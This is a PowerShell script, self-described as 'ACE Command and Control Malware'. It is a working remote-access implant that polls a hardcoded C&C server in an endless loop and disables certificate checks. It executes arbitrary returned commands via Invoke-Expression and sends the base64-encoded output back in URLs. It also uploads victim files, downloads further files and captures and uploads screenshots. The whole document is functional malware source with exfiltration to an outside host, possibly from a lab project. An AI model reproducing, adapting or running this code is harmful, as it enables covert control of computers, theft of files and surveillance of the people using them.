<#
ACE Command and Control Malware
Objective is to create a program/script that will reach out to a C&C Server to obtain commands
This program should also be able to exfil data

Current goal is to make a script that:
A) reaches out to a C&C (either scp, ssh or directly to a webpage)
    - Currently via webpag
B) Receive commands needed
    - Currently checks webpage for command
C) perform commands
    - Executes commands
D) send results back to C&C server (part 1 of exfil)
    - Sends results back by base64 encode and post request to webpage
E) send files back to C&C server (csv, txt, or w/e)


######
## UPDATES
######

v0.2 
    - Added HTTPS
    - Modified Run Command to use "DownloadString" for "GET" instead of Invoke Web Request
    - Mofified Upload (victim to attacker) to use "UploadString" for POST request
    - Modified Screenshot to use UploadString for PUT request
#>


# Endless loop
while ($true)
{ $i++

Add-Type @"
    using System;
    using System.Net;
    using System.Net.Security;
    using System.Security.Cryptography.X509Certificates;
    public class ServerCertificateValidationCallback{
        public static void Ignore(){
            ServicePointManager.ServerCertificateValidationCallback += delegate(
                Object obj,
                X509Certificate certificate,
                X509Chain chain,
                SslPolicyErrors errors
            )
            {
                return true;
            };
        }
    }
"@


# Connect to C&C, check to see if command is available (make sure it is not the same command as before)
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
#ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls13;
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ccserver = "10.197.27.89:8000" # IP of C&C Server
#$ccserver = "10.197.27.89:4443" # IP of C&C Server
$web = New-Object System.Net.WebClient
$Path = $env:UserProfile + "\AppData\Local\Temp\" # Path of Temp in UserProfile
$commandPath = $Path + "command.txt" # Command.txt of Path of temp


# Check if Temp File exists, if not, create
if(Test-Path $commandPath) {
} else {
New-Item -Path $Path -Name "command.txt" -ItemType "file" -Value "whoami"
}

# Add previous command to variable
$PreviousCommand = [IO.File]::ReadAllText($commandPath)

# Make sure C&C is online
Try{
$Command = $web.DownloadString("https://$ccserver/cc.js")
Write-Output $Command
}
Catch{
Write-Warning $error[0].Exception.InnerException
#Write-Warning "Server is offline"
#Write-Output $Command
}

#Parse command
$a = $Command -replace "`n","," 
$b = $a -split ',' 
$CurrentCommand = $b[1]
$Indicator = $b[0]

#write-host CurrentCommand is: $CurrentCommand
#write-host Previous is: $PreviousCommand
#write-host Indicator: $Indicator

# Run Commands
if($Indicator -eq '1' -And $PreviousCommand -ne $CurrentCommand) {
    write-host "Found a command, running it"
    $CurrentCommand | out-file -filepath $commandPath -NoNewLine

    # Perform Command and save to variable
    $CommandOutput = Invoke-Expression $CurrentCommand
    #write-output command is $CommandOutput
    # Encode Command to Base64
    $Bytes1 = [System.Text.Encoding]::Unicode.GetBytes($CurrentCommand)
    $EncodedCommand = [Convert]::ToBase64String($Bytes1)

    # Encode Output to Base64
    $Bytes2 = [System.Text.Encoding]::Unicode.GetBytes($CommandOutput)
    $EncodedOutput = [Convert]::ToBase64String($Bytes2)

    # Connect back to C&C and send Base64 post request
    try {
        #$respond = Invoke-WebRequest -Uri https://$ccserver/$EncodedCommand/$EncodedOutput -Method GET -UseBasicParsing -ErrorAction Stop
        $respond = $web.DownloadString("https://$ccserver/$EncodedCommand/$EncodedOutput")
        # Modified the above for download string instead of webrequest
        $StatusCode = $Response.StatusCode
        }
    catch {
        $StatusCode = $_.Exception.Response.StatusCode.value__
        Write-Warning $error[0].Exception.InnerException
        }
} 

###############
# File Upload - Grab file from Victim and Send to Attacker
###############
elseif($Indicator -eq '2' -And $PreviousCommand -ne $CurrentCommand) {
    write-host "Time to upload a file!"
    $CurrentCommand | out-file -filepath $commandPath -NoNewLine

    write-host "File to get is:" $CurrentCommand

    #$respond = Invoke-WebRequest -Uri $ccserver -Method POST -UseBasicParsing -ErrorAction Stop

    $body = "$(get-content $CurrentCommand -raw)"
    #$respond = Invoke-RestMethod -uri $ccserver -method POST -body $body -UseBasicParsing -ErrorAction Stop
    $respond = $web.UploadString("https://$ccserver", $body)
    $StatusCode = $Response.StatusCode

    $StatusCode

} 
###########
## DOWNLOAD A FILE
###########
elseif($Indicator -eq '3' -And $PreviousCommand -ne $CurrentCommand) {
#if($Indicator -eq '3') {
    write-host "Downloading file..."
    $CurrentCommand | out-file -filepath $commandPath -NoNewLine

    # Perform Command and save to variable
    $CommandOutput = $web.DownloadFile("https://$ccserver/$CurrentCommand", $CurrentCommand)
    
    
    # Necessary to wait for next instruction
    Start-Sleep -s 5

} 
######
# Take Screenshot
# TODO: Figure out to stop loop of screenshot
######
elseif($Indicator -eq '4' -And $PreviousCommand -ne $CurrentCommand){
    write-host "Taking screenshot..."
    $CurrentCommand | out-file -filepath $commandPath -NoNewLine
    ##### Perform Screencapture and save ######
    # Save pic location
    $CaptureFile = 'C:\Users\Eric\Desktop\CC\Screenshot.bmp'
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    # Gather Screen resolution information
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    # Create bitmap using the top-left and bottom-right bounds
    $bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
    # Create Graphics object
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    # Capture Screen
    $graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size)
    # Save to file
    $bitmap.Save($CaptureFile)
    Write-Output "Screenshot saved to:"
    Write-Output $CaptureFile
    ###### Complete Screencapture ######

    #### UPLOAD SCREENSHOT TO ATTACKER ####
    write-host "File to get is:" $CaptureFile

    $base64Image = [convert]::ToBase64String((get-content $CaptureFile -encoding byte))
    #$respond = Invoke-WebRequest -uri $ccserver/screenshot1.bmp -Method PUT -Body $base64Image -ContentType "application/base64" -UseBasicParsing -ErrorAction Stop
    $respond = $web.UploadString("https://$ccserver/screenshot1.bmp", "PUT", $base64Image)
    $StatusCode = $Response.StatusCode

    $StatusCode
    
    # Necessary to wait for next instruction
    Start-Sleep -s 5
}
#########
# Exit
#########
else {
    write-host "Duplicate commands or invalid request. Let's take a breather"
    $CurrentCommand | out-file -filepath $commandPath -NoNewLine
    #exit
}


# Sleep 15 seconds
Start-Sleep -s 5

} # End infinit loop